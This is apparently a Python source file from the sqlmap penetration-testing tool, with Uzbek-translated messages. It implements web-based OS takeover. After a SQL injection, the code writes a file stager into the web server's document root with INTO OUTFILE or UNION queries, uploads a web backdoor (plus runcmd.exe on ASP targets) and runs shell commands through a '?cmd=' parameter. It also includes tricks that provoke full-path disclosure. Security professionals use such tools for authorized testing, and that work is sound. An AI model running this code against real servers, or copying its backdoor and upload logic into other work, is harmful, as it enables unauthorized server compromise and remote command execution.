#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.uzbek import ut
import io
import os
import posixpath
import re
import tempfile

from extra.cloak.cloak import decloak
from lib.core.agent import agent
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import extractRegexResult
from lib.core.common import getAutoDirectories
from lib.core.common import getManualDirectories
from lib.core.common import getPublicTypeMembers
from lib.core.common import getSQLSnippet
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import isDigit
from lib.core.common import isTechniqueAvailable
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import openFile
from lib.core.common import parseFilePaths
from lib.core.common import posixToNtSlashes
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.convert import encodeHex
from lib.core.convert import getBytes
from lib.core.convert import getText
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.datatype import OrderedSet
from lib.core.enums import DBMS
from lib.core.enums import HTTP_HEADER
from lib.core.enums import OS
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.enums import WEB_PLATFORM
from lib.core.exception import SqlmapNoneDataException
from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
from lib.core.settings import EVENTVALIDATION_REGEX
from lib.core.settings import SHELL_RUNCMD_EXE_TAG
from lib.core.settings import SHELL_WRITABLE_DIR_TAG
from lib.core.settings import VIEWSTATE_REGEX
from lib.request.connect import Connect as Request
from thirdparty.six.moves import urllib as _urllib

class Web(object):
    """
    This class defines web-oriented OS takeover functionalities for
    plugins.
    """

    def __init__(self):
        self.webPlatform = None
        self.webBaseUrl = None
        self.webBackdoorUrl = None
        self.webBackdoorFilePath = None
        self.webStagerUrl = None
        self.webStagerFilePath = None
        self.webDirectory = None

    def webBackdoorRunCmd(self, cmd):
        if self.webBackdoorUrl is None:
            return

        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl = "%s?cmd=%s" % (self.webBackdoorUrl, getUnicode(cmd))
        page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True, timeout=BACKDOOR_RUN_CMD_TIMEOUT)

        if page is not None:
            output = re.search(r"<pre>(.+?)</pre>", page, re.I | re.S)

            if output:
                output = output.group(1)

        return output

    def webUpload(self, destFileName, directory, stream=None, content=None, filepath=None):
        if filepath is not None:
            if filepath.endswith('_'):
                content = decloak(filepath)  # cloaked file
            else:
                with openFile(filepath, "rb", encoding=None) as f:
                    content = f.read()

        if content is not None:
            stream = io.BytesIO(getBytes(content))  # string content

            # Reference: https://github.com/sqlmapproject/sqlmap/issues/3560
            # Reference: https://stackoverflow.com/a/4677542
            stream.seek(0, os.SEEK_END)
            stream.len = stream.tell()
            stream.seek(0, os.SEEK_SET)

        return self._webFileStreamUpload(stream, destFileName, directory)

    def _webFileStreamUpload(self, stream, destFileName, directory):
        stream.seek(0)  # Rewind

        try:
            setattr(stream, "name", destFileName)
        except TypeError:
            pass

        if self.webPlatform in getPublicTypeMembers(WEB_PLATFORM, True):
            multipartParams = {
                "upload": "1",
                "file": stream,
                "uploadDir": directory,
            }

            if self.webPlatform == WEB_PLATFORM.ASPX:
                multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE

            page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)

            if "File uploaded" not in (page or ""):
                warnMsg = "faylni veb-yuklash vositasi orqali yuklab bo'lmadi: "
                warnMsg += "yuklash vositasi: '%s'" % directory
                logger.warning(warnMsg)
                return False
            else:
                return True
        else:
            logger.error("sqlmapda %s uchun veb-backdoor yoki fayl yuklash vositasi yo'q" % self.webPlatform)
            return False

    def _webFileInject(self, fileContent, fileName, directory):
        outFile = posixpath.join(ntToPosixSlashes(directory), fileName)
        uplQuery = getUnicode(fileContent).replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
        query = ""

        if isTechniqueAvailable(getTechnique()):
            where = getTechniqueData().where

            if where == PAYLOAD.WHERE.NEGATIVE:
                randInt = randomInt()
                query += "OR %d=%d " % (randInt, randInt)

        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=encodeHex(uplQuery, binary=False))
        query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
        payload = agent.payload(newValue=query)
        page = Request.queryPage(payload)

        return page

    def webInit(self):
        """
        This method is used to write a web backdoor (agent) on a writable
        remote directory within the web server document root.
        """

        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webPlatform is not None:
            return

        self.checkDbmsOs()

        default = None
        choices = list(getPublicTypeMembers(WEB_PLATFORM, True))

        for ext in choices:
            if conf.url.endswith(ext):
                default = ext
                break

        if not default:
            default = WEB_PLATFORM.ASP if Backend.isOs(OS.WINDOWS) else WEB_PLATFORM.PHP

        message = ut('which web application language does the web server ', 'veb-server qaysi veb-ilova tilini ')
        message += ut('support?\n', "qo'llaydi?\n")

        for count in xrange(len(choices)):
            ext = choices[count]
            message += "[%d] %s%s\n" % (count + 1, ext.upper(), (" (default)" if default == ext else ""))

            if default == ext:
                default = count + 1

        message = message[:-1]

        while True:
            choice = readInput(message, default=str(default))

            if not isDigit(choice):
                logger.warning("noto'g'ri qiymat, faqat raqamlar mumkin")

            elif int(choice) < 1 or int(choice) > len(choices):
                logger.warning("noto'g'ri qiymat, 1 dan %d gacha bo'lishi kerak" % len(choices))

            else:
                self.webPlatform = choices[int(choice) - 1]
                break

        if not kb.absFilePaths:
            message = ut('do you want sqlmap to further try to ', 'Sqlmap yana ')
            message += ut('provoke the full path disclosure? [Y/n] ', "to'liq yo'lni oshkor qilishga urinsinmi? [Y/n] ")

            if readInput(message, default='Y', boolean=True):
                headers = {}
                been = set([conf.url])

                for match in re.finditer(r"=['\"]((https?):)?(//[^/'\"]+)?(/[\w/.-]*)\bwp-", kb.originalPage or "", re.I):
                    url = "%s%s" % (conf.url.replace(conf.path, match.group(4)), "wp-content/wp-db.php")
                    if url not in been:
                        try:
                            page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
                            parseFilePaths(page)
                        except:
                            pass
                        finally:
                            been.add(url)

                url = re.sub(r"(\.\w+)\Z", r"~\g<1>", conf.url)
                if url not in been:
                    try:
                        page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
                        parseFilePaths(page)
                    except:
                        pass
                    finally:
                        been.add(url)

                for place in (PLACE.GET, PLACE.POST):
                    if place in conf.parameters:
                        value = re.sub(r"(\A|&)(\w+)=", r"\g<2>[]=", conf.parameters[place])
                        if "[]" in value:
                            page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)
                            parseFilePaths(page)

                cookie = None
                if PLACE.COOKIE in conf.parameters:
                    cookie = conf.parameters[PLACE.COOKIE]
                elif headers and HTTP_HEADER.SET_COOKIE in headers:
                    cookie = headers[HTTP_HEADER.SET_COOKIE]

                if cookie:
                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
                    if value != cookie:
                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                        parseFilePaths(page)

                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=", cookie)
                    if value != cookie:
                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                        parseFilePaths(page)

        directories = list(arrayizeValue(getManualDirectories()))
        directories.extend(getAutoDirectories())
        directories = list(OrderedSet(directories))

        path = _urllib.parse.urlparse(conf.url).path or '/'
        path = re.sub(r"/[^/]*\.\w+\Z", '/', path)
        if path != '/':
            _ = []
            for directory in directories:
                _.append(directory)
                if not directory.endswith(path):
                    _.append("%s/%s" % (directory.rstrip('/'), path.strip('/')))
            directories = _

        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webPlatform)
        backdoorContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webPlatform)))

        stagerContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform)))

        for directory in directories:
            if not directory:
                continue

            stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webPlatform)
            self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)

            uploaded = False
            directory = ntToPosixSlashes(normalizePath(directory))

            if not isWindowsDriveLetterPath(directory) and not directory.startswith('/'):
                directory = "/%s" % directory

            if not directory.endswith('/'):
                directory += '/'

            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE method
            infoMsg = "fayl yuklash vositasi '%s' ga yuklanmoqda " % directory
            infoMsg += "LIMIT 'LINES TERMINATED BY' usuli orqali"
            logger.info(infoMsg)
            self._webFileInject(stagerContent, stagerName, directory)

            for match in re.finditer('/', directory):
                self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)
                debugMsg = "faylga '%s' orqali kirish mumkinligi tekshirilmoqda" % self.webStagerUrl
                logger.debug(debugMsg)

                uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                uplPage = uplPage or ""

                if "sqlmap file uploader" in uplPage:
                    uploaded = True
                    break

            # Fall-back to UNION queries file upload method
            if not uploaded:
                warnMsg = "fayl yuklash vositasini yuklab bo'lmadi "
                warnMsg += "'%s' manzilida" % directory
                singleTimeWarnMessage(warnMsg)

                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                    infoMsg = "fayl yuklash vositasi '%s' ga yuklanmoqda " % directory
                    infoMsg += 'UNION usuli orqali'
                    logger.info(infoMsg)

                    stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webPlatform)
                    self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)

                    handle, filename = tempfile.mkstemp()
                    os.close(handle)

                    with openFile(filename, "w+") as f:
                        _ = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform)))
                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
                        f.write(_)

                    self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)

                    for match in re.finditer('/', directory):
                        self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                        self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)

                        debugMsg = "faylga '%s' orqali kirish mumkinligi tekshirilmoqda" % self.webStagerUrl
                        logger.debug(debugMsg)

                        uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                        uplPage = uplPage or ""

                        if "sqlmap file uploader" in uplPage:
                            uploaded = True
                            break

            if not uploaded:
                continue

            if "<%" in uplPage or "<?" in uplPage:
                warnMsg = "fayl yuklash vositasi '%s' ga yuklandi, " % directory
                warnMsg += 'ammo dinamik tarzda bajarilmadi'
                logger.warning(warnMsg)
                continue

            elif self.webPlatform == WEB_PLATFORM.ASPX:
                kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
                kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)

            infoMsg = 'fayl yuklash vositasi muvaffaqiyatli yuklandi '
            infoMsg += "'%s' manzilida - %s" % (directory, self.webStagerUrl)
            logger.info(infoMsg)

            if self.webPlatform == WEB_PLATFORM.ASP:
                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)

                if match:
                    backdoorDirectory = match.group(1)
                else:
                    continue

                _ = "tmpe%s.exe" % randomStr(lowercase=True)
                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace(SHELL_WRITABLE_DIR_TAG, backdoorDirectory).replace(SHELL_RUNCMD_EXE_TAG, _)):
                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, "runcmd", "runcmd.exe_"))
                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                    self.webDirectory = backdoorDirectory
                else:
                    continue

            else:
                if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):
                    warnMsg = 'backdoor muvaffaqiyatli yuklanmadi; '
                    warnMsg += 'fayl yuklash vositasidagi muammoning ehtimoliy sababi: '
                    warnMsg += 'veb-server jarayonini ishlatayotgan foydalanuvchining '
                    warnMsg += "papkaga yozish huquqi yo'q; "
                    warnMsg += 'shu papkaga DBMS jarayoni foydalanuvchisi '
                    warnMsg += 'fayl yuklash vositasini yoza olgan, yoki '
                    warnMsg += 'DBMS va veb-server '
                    warnMsg += 'turli serverlarda joylashgan'
                    logger.warning(warnMsg)

                    message = ut('do you want to try the same method used ', 'fayl yuklash vositasi uchun ishlatilgan ')
                    message += ut('for the file stager? [Y/n] ', "usulni sinab ko'rasizmi? [Y/n] ")

                    if readInput(message, default='Y', boolean=True):
                        self._webFileInject(backdoorContent, backdoorName, directory)
                    else:
                        continue

                self.webBackdoorUrl = posixpath.join(ntToPosixSlashes(self.webBaseUrl), backdoorName)
                self.webDirectory = directory

            self.webBackdoorFilePath = posixpath.join(ntToPosixSlashes(directory), backdoorName)

            testStr = "command execution test"
            output = self.webBackdoorRunCmd("echo %s" % testStr)

            if output == "0":
                warnMsg = 'backdoor yuklandi, ammo tizim buyruqlarini '
                warnMsg += "bajarish uchun zarur huquqlar yo'q"
                raise SqlmapNoneDataException(warnMsg)
            elif output and testStr in output:
                infoMsg = 'backdoor muvaffaqiyatli '
            else:
                infoMsg = 'backdoor katta ehtimol bilan muvaffaqiyatli '

            infoMsg += "'%s' ga yuklandi - " % self.webDirectory
            infoMsg += self.webBackdoorUrl
            logger.info(infoMsg)

            break
